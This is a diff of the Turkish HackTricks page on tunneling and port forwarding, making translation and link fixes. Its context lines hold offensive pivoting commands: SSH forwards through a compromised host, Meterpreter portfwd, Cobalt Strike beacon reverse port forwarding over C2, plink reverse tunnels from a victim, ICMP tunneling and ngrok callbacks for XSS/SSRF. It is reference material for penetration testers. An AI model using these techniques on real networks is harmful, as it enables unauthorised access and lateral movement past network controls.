@@ -1,15 +1,15 @@
 # Tünelleme ve Port Yönlendirme
 
 {% hint style="success" %}
-AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking öğrenin ve pratik yapın:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
@@ -65,7 +65,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Yerel Port --> Ele geçirilmiş host (SSH) --> Herhangi bir yere
+Yerel Port --> Ele geçirilmiş host (SSH) --> Herhangi bir yer
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -82,7 +82,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tüneli
 
-Her iki cihazda da **root erişimine ihtiyacınız var** (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırması root girişine izin vermelidir:\
+Her iki cihazda da **root erişimine** ihtiyacınız var (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırması root girişine izin vermelidir:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -97,7 +97,7 @@ Sunucu tarafında yönlendirmeyi etkinleştirin
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-Müşteri tarafında yeni bir rota ayarlayın
+İstemci tarafında yeni bir rota ayarlayın
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
@@ -118,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Yerel port --> Ele geçirilmiş ana bilgisayar (aktif oturum) --> Üçüncü\_kutusu:Port
+Yerel port --> Ele geçirilmiş host (aktif oturum) --> Üçüncü\_kutusu:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -165,13 +165,13 @@ Bu durumda, **port beacon host'ta açılır**, Team Server'da değil ve trafik T
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-To note:
+Not edilmesi gerekenler:
 
-- Beacon'ın ters port yönlendirmesi, **bireysel makineler arasında iletim için değil, Trafiği Takım Sunucusuna tünellemek için tasarlanmıştır**.
-- Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları dahil.
-- **Yönetici ayrıcalıkları gerekmemektedir** yüksek portlarda ters port yönlendirmeleri oluşturmak için.
+* Beacon'ın ters port yönlendirmesi, **bireysel makineler arasında iletim için değil, Trafiği Takım Sunucusuna tünellemek için tasarlanmıştır**.
+* Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları dahil.
+* **Yüksek portlarda ters port yönlendirmeleri oluşturmak için yönetici ayrıcalıkları gerekmez**.
 
-### rPort2Port local
+### rPort2Port yerel
 
 {% hint style="warning" %}
 Bu durumda, **port beacon ana bilgisayarında açılır**, Takım Sunucusunda değil ve **trafik Cobalt Strike istemcisine gönderilir** (Takım Sunucusuna değil) ve oradan belirtilen host:port'a iletilir.
@@ -306,7 +306,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 **/bin/sh konsolu**
 
-Her iki tarafta da: İstemci ve Sunucu için sertifikalar oluşturun
+Her iki tarafta da sertifikalar oluşturun: İstemci ve Sunucu
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -332,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Bu, bir konsol PuTTY versiyonuna benzer (seçenekler, bir ssh istemcisine çok benzer).
 
-Bu ikili dosya kurban üzerinde çalıştırılacağından ve bir ssh istemcisi olduğundan, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
+Bu ikili dosya kurban üzerinde çalıştırılacağı için ve bir ssh istemcisi olduğu için, ters bağlantı kurabilmemiz için ssh hizmetimizi ve portumuzu açmamız gerekiyor. Ardından, yalnızca yerel olarak erişilebilir bir portu makinemizdeki bir porta yönlendirmek için:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -370,7 +370,7 @@ Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** ile **bağlanabi
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Şimdi, makinenizde (saldırgan) 1080 numaralı portun dinlendiğini doğrulayın:
+Şimdi, makinenizde (saldırgan) 1080 numaralı portun dinlediğini doğrulayın:
 ```
 netstat -antb | findstr 1080
 ```
@@ -393,7 +393,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş olarak yerel bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
+Bir proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz dış hizmete yönlendirilmiş olarak yerel olarak bir port bağlar. Ardından, bu port üzerinden tercih ettiğiniz aracı kullanabilirsiniz.\
 Örneğin, 443 portunu yönlendirin.
 ```
 Username Alice
@@ -452,7 +452,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Proxychains DNS'ini Değiştir
 
-Proxychains, `gethostbyname` libc çağrısını keser ve tcp DNS isteğini socks proxy üzerinden tüneller. **Varsayılan** olarak proxychains'in kullandığı **DNS** sunucusu **4.2.2.2**'dir (hardcoded). Bunu değiştirmek için dosyayı düzenleyin: _/usr/lib/proxychains3/proxyresolv_ ve IP'yi değiştirin. **Windows ortamında** iseniz, **domain controller**'ın IP'sini ayarlayabilirsiniz.
+Proxychains `gethostbyname` libc çağrısını keser ve tcp DNS isteğini socks proxy üzerinden tüneller. **Varsayılan** olarak proxychains'in kullandığı **DNS** sunucusu **4.2.2.2**'dir (hardcoded). Bunu değiştirmek için dosyayı düzenleyin: _/usr/lib/proxychains3/proxyresolv_ ve IP'yi değiştirin. **Windows ortamında** iseniz, **domain controller**'ın IP'sini ayarlayabilirsiniz.
 
 ## Go'da Tüneller
 
@@ -465,7 +465,7 @@ Proxychains, `gethostbyname` libc çağrısını keser ve tcp DNS isteğini sock
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Her iki sistemde de tun adaptörleri oluşturmak ve ICMP echo istekleri kullanarak aralarında veri tünellemek için root gereklidir.
+Her iki sistemde de tun adaptörleri oluşturmak ve ICMP echo istekleri kullanarak veri tünellemek için root gereklidir.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -489,13 +489,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/) çözümleri tek bir komut satırıyla internete açmak için bir araçtır.**
-*Maruz kalma URI'leri şunlardır:* **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **çözümleri tek bir komut satırıyla internete açmak için bir araçtır.**\
+&#xNAN;_&#x45;xposition URI şunlar gibidir:_ **UID.ngrok.io**
 
 ### Kurulum
 
-- Bir hesap oluşturun: https://ngrok.com/signup
-- İstemci indirme:
+* Bir hesap oluşturun: https://ngrok.com/signup
+* İstemci indirme:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -506,7 +506,7 @@ chmod a+x ./ngrok
 
 **Dokümantasyon:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*Gerekirse kimlik doğrulama ve TLS eklemek de mümkündür.*
+_Gerekirse kimlik doğrulama ve TLS eklemek de mümkündür._
 
 #### TCP Tünelleme
 ```bash
@@ -523,8 +523,8 @@ chmod a+x ./ngrok
 ```
 #### HTTP çağrılarını dinleme
 
-*XSS, SSRF, SSTI için faydalıdır...*
-stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000) adresinden doğrudan.
+_XSS, SSRF, SSTI ... için faydalıdır._\
+Doğrudan stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Dahili HTTP hizmetini tünelleme
 ```bash
@@ -536,8 +536,9 @@ stdout'dan veya HTTP arayüzünden [http://127.0.0.1:4040](http://127.0.0.1:4000
 #### ngrok.yaml basit yapılandırma örneği
 
 3 tünel açar:
-- 2 TCP
-- 1 HTTP, /tmp/httpbin/ dizininden statik dosya sergilemesiyle
+
+* 2 TCP
+* 1 HTTP, /tmp/httpbin/ dizininden statik dosyaların sergilenmesiyle
 ```yaml
 tunnels:
 mytcp:
@@ -556,15 +557,15 @@ addr: file:///tmp/httpbin/
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 {% hint style="success" %}
-AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking öğrenin ve pratik yapın:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking öğrenin ve pratik yapın: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
 * **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
